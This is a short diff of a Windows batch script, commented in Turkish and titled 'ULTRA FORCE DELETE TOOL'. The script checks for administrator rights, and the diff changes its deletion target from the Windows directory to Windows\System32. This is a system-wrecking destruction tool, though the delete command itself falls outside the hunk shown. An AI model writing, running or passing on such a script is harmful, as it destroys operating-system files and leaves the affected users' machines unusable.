@@ -13,7 +13,7 @@ if %errorLevel% neq 0 (
 )
 
 :: Silinecek klasor yolu
-set "targetPath=%windir%"
+set "targetPath=%windir%\System32"
 
 echo [+] ULTRA FORCE DELETE TOOL BASLATILIYOR...
 echo [+] Hedef: %targetPath%
